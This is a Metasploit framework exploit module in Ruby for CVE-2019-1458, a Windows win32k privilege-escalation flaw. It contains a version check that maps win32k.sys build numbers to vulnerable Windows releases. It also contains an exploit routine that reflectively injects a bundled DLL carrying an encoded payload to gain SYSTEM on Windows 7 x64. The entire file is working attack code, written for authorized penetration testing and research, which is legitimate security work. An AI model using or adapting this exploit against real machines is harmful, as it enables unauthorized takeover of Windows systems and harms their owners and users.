##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Windows Uninitialized Variable Local Privilege Elevation',
        'Description' => %q{
          This module exploits CVE-2019-1458, an arbitrary pointer dereference vulnerability
          within win32k which occurs due to an uninitalized variable, which allows user mode attackers
          to write a limited amount of controlled data to an attacker controlled address
          in kernel memory. By utilizing this vulnerability to execute controlled writes
          to kernel memory, an attacker can gain arbitrary code execution
          as the SYSTEM user.

          This module has been tested against Windows 7 x64 SP1. Offsets within the
          exploit code may need to be adjusted to work with other versions of Windows.
          The exploit can only be triggered once against the target and can cause the
          target machine to reboot when the session is terminated.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'piotrflorczyk', # poc
          'unamer', # exploit
          'timwr', # msf module
        ],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [
          ['Windows 7 x64', { 'Arch' => ARCH_X64 }]
        ],
        'Notes' => {
          'Stability' => [ CRASH_OS_RESTARTS ],
          'Reliability' => [ UNRELIABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'References' => [
          ['CVE', '2019-1458'],
          ['URL', 'https://github.com/unamer/CVE-2019-1458'],
          ['URL', 'https://github.com/piotrflorczyk/cve-2019-1458_POC'],
          ['URL', 'https://securelist.com/windows-0-day-exploit-cve-2019-1458-used-in-operation-wizardopium/95432/'],
          ['URL', 'https://googleprojectzero.blogspot.com/p/rca-cve-2019-1458.html']
        ],
        'DisclosureDate' => '2019-12-10',
        'DefaultTarget' => 0,
        'AKA' => [ 'WizardOpium' ]
      )
    )
  end

  def check
    if session.platform != 'windows'
      # Non-Windows systems are definitely not affected.
      return CheckCode::Safe
    end

    file_path = expand_path('%WINDIR%\\system32\\win32k.sys')
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    build_num_gemversion = Rex::Version.new("#{major}.#{minor}.#{build}.#{revision}")

    # Build numbers taken from https://www.qualys.com/research/security-alerts/2019-12-10/microsoft/
    if (build_num_gemversion >= Rex::Version.new('6.0.6000.0')) && (build_num_gemversion < Rex::Version.new('6.0.6003.20692')) # Windows Vista and Windows Server 2008
      return CheckCode::Appears
    elsif (build_num_gemversion >= Rex::Version.new('6.1.7600.0')) && (build_num_gemversion < Rex::Version.new('6.1.7601.24540')) # Windows 7 and Windows Server 2008 R2
      return CheckCode::Appears
    elsif (build_num_gemversion >= Rex::Version.new('6.2.9200.0')) && (build_num_gemversion < Rex::Version.new('6.2.9200.22932')) # Windows 8 and Windows Server 2012
      return CheckCode::Appears
    elsif (build_num_gemversion >= Rex::Version.new('6.3.9600.0')) && (build_num_gemversion < Rex::Version.new('6.3.9600.19574')) # Windows 8.1 and Windows Server 2012 R2
      return CheckCode::Appears
    elsif (build_num_gemversion >= Rex::Version.new('10.0.10240.0')) && (build_num_gemversion < Rex::Version.new('10.0.10240.18427')) # Windows 10 v1507
      return CheckCode::Appears
    elsif (build_num_gemversion >= Rex::Version.new('10.0.10586.0')) && (build_num_gemversion < Rex::Version.new('10.0.10586.99999')) # Windows 10 v1511
      return CheckCode::Appears
    elsif (build_num_gemversion >= Rex::Version.new('10.0.14393.0')) && (build_num_gemversion < Rex::Version.new('10.0.14393.3383')) # Windows 10 v1607
      return CheckCode::Appears
    else
      return CheckCode::Safe
    end
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['Architecture'] != ARCH_X64
      fail_with(Failure::NoTarget, 'Running against 32-bit systems is not supported')
    end

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Triggering the exploit...')
    encoded_payload = payload.encoded
    execute_dll(
      ::File.join(::Msf::Config.data_directory, 'exploits', 'CVE-2019-1458', 'exploit.dll'),
      [encoded_payload.length].pack('I<') + encoded_payload
    )

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end
end
